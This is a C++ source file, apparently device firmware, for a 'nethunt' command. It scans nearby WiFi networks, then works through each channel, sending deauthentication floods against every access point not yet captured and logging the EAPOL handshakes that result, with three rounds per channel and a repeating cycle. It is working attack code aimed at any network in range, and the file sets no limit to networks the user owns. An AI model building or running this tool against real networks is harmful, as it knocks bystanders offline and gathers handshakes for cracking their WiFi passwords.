#include "NethuntCommand.h"
#include "../../net/WiFiHunter.h"
#include <WiFi.h>
#include <cstring>
#include <cstdio>
#include <cstdlib>

static constexpr uint32_t DEAUTH_WAIT_MS = 5000;
static constexpr uint32_t EXHAUST_MS     = 60000;
static constexpr uint8_t  DEAUTH_ROUNDS  = 3;

void NethuntCommand::init(WiFiHunter* hunter) { _hunter = hunter; }

void NethuntCommand::startHardware() {
    if (!_hunter) return;
    _huntPhase = HuntPhase::StartScan;
}

void NethuntCommand::stopService(IMenuHost& host) {
    WiFi.scanDelete();
    if (_hunter) _hunter->pause();
    host.cmdPush("service nethunt stop");
}

void NethuntCommand::clearState() {
    _lastCaptureCount        = 0;
    _lastEapolEventCount     = 0;
    _lastExternalDeauthCount = 0;
    _channel      = 1;
    _channelMask  = 0;
    _deauthRound  = 0;
    _pauseUntilMs = 0;
    _huntPhase    = HuntPhase::StartScan;
}

// ── Helpers ───────────────────────────────────────────────────

static uint8_t firstChannelInMask(uint16_t mask) {
    for (uint8_t ch = 1; ch <= 13; ch++)
        if (mask & (1u << ch)) return ch;
    return 0;
}

// ── Update ────────────────────────────────────────────────────

void NethuntCommand::update(IMenuHost& host, uint32_t ms) {
    if (!_hunter || host.menuIsOpen()) return;

    if (_huntPhase != HuntPhase::StartScan && _huntPhase != HuntPhase::Scanning)
        _hunter->update(ms);

    // ── Event display ─────────────────────────────────────────
    uint32_t eec = _hunter->eapolEventCount();
    if (eec > _lastEapolEventCount) {
        _lastEapolEventCount = eec;
        int msg = _hunter->lastEapolMsg();
        const char* esid = _hunter->lastEapolSsid();
        char buf[52];
        snprintf(buf, sizeof(buf), "traced eapol M%d %.32s", msg, (esid && esid[0]) ? esid : "??");
        host.outPush(buf);
    }

    uint32_t edc = _hunter->externalDeauthCount();
    if (edc > _lastExternalDeauthCount) {
        _lastExternalDeauthCount = edc;
        const char* eid = _hunter->lastExternalDeauthSsid();
        char buf[48];
        snprintf(buf, sizeof(buf), "alert deauth %.32s", (eid && eid[0]) ? eid : "??");
        host.outPush(buf);
    }

    uint32_t caps = _hunter->captureCount();
    if (caps > _lastCaptureCount) {
        _lastCaptureCount = caps;
        const char* path  = _hunter->lastCapturePath();
        const char* fname = strrchr(path, '/');
        fname = fname ? fname + 1 : path;
        host.onCapture();
        uint16_t r1 = 0x1000 + (uint16_t)(rand() & 0xCFFF);
        uint16_t r2 = r1 + (uint16_t)(rand() & 0x0FFF) + 0x100;
        char buf[52];
        snprintf(buf, sizeof(buf), "dump 0x%04x..0x%04x >> %.27s", r1, r2, fname);
        host.cmdPush(buf);
    }

    // ── State machine ─────────────────────────────────────────
    switch (_huntPhase) {

    case HuntPhase::StartScan:
        _hunter->clearFindings(ms);
        _lastCaptureCount        = 0;
        _lastEapolEventCount     = 0;
        _lastExternalDeauthCount = 0;
        _hunter->pause();
        WiFi.scanNetworks(/*async=*/true);
        host.cmdPush("scan wifi");
        _huntPhase = HuntPhase::Scanning;
        break;

    case HuntPhase::Scanning: {
        int n = WiFi.scanComplete();
        if (n == WIFI_SCAN_RUNNING) break;
        _hunter->resume();
        if (n < 0) n = 0;
        for (int i = 0; i < n; i++) {
            uint8_t* bssid = WiFi.BSSID(i);
            if (!bssid) continue;
            String  ssid = WiFi.SSID(i);
            uint8_t ch   = (uint8_t)WiFi.channel(i);
            _hunter->registerApFromScan(bssid, ssid.c_str(), ch);
        }
        WiFi.scanDelete();
        host.outPush("scan complete");
        _huntPhase = HuntPhase::ScanDone;
        break;
    }

    case HuntPhase::ScanDone: {
        _channelMask = 0;
        uint8_t total   = _hunter->apCount();
        uint8_t ignored = 0;
        uint8_t pending = 0;
        for (uint8_t i = 0; i < total; i++) {
            const WiFiHunter::ApInfo* ap = _hunter->apInfoAt(i);
            if (!ap) continue;
            if (ap->validated) { ignored++; continue; }
            if (ap->channel >= 1 && ap->channel <= 13)
                _channelMask |= (1u << ap->channel);
            pending++;
        }
        uint8_t chanCount = 0;
        for (uint8_t ch = 1; ch <= 13; ch++)
            if (_channelMask & (1u << ch)) chanCount++;
        {
            char buf[52];
            snprintf(buf, sizeof(buf), "found %d wifi across %d channel", pending, chanCount);
            host.outPush(buf);
        }
        if (ignored > 0) {
            char buf[56];
            snprintf(buf, sizeof(buf), "ignore %d wifi (for having complete eapol)", ignored);
            host.outPush(buf);
        }
        _channel = firstChannelInMask(_channelMask);
        if (_channel == 0) {
            _pauseUntilMs = ms + EXHAUST_MS;
            _huntPhase    = HuntPhase::Exhaust;
            host.cmdPush("nethunt exhaust 60");
        } else {
            _huntPhase = HuntPhase::SetChannel;
        }
        break;
    }

    case HuntPhase::SetChannel: {
        _hunter->setChannel(_channel);
        {
            char buf[24];
            snprintf(buf, sizeof(buf), "deauth channel %d", _channel);
            host.cmdPush(buf);
        }
        uint8_t count = _hunter->apCount();
        for (uint8_t i = 0; i < count; i++) {
            const WiFiHunter::ApInfo* ap = _hunter->apInfoAt(i);
            if (!ap || ap->channel != _channel || ap->validated) continue;
            char buf[40];
            snprintf(buf, sizeof(buf), "- %.36s", ap->ssid[0] ? ap->ssid : "??");
            host.outPush(buf);
        }
        _deauthRound = 1;
        _huntPhase   = HuntPhase::DeauthRound;
        break;
    }

    case HuntPhase::DeauthRound:
        _hunter->deauthAllOnChannel(_channel);
        _pauseUntilMs = ms + DEAUTH_WAIT_MS;
        _huntPhase    = HuntPhase::WaitRound;
        break;

    case HuntPhase::WaitRound:
        if (ms < _pauseUntilMs) break;
        if (_deauthRound < DEAUTH_ROUNDS) {
            _deauthRound++;
            _huntPhase = HuntPhase::DeauthRound;
        } else {
            _huntPhase = HuntPhase::NextChannel;
        }
        break;

    case HuntPhase::NextChannel:
        _channelMask &= ~(1u << _channel);
        _channel = firstChannelInMask(_channelMask);
        if (_channel != 0) {
            _huntPhase = HuntPhase::SetChannel;
        } else {
            _pauseUntilMs = ms + EXHAUST_MS;
            _huntPhase    = HuntPhase::Exhaust;
            host.cmdPush("nethunt exhaust 60");
        }
        break;

    case HuntPhase::Exhaust:
        if (ms < _pauseUntilMs) break;
        _huntPhase = HuntPhase::StartScan;
        break;
    }
}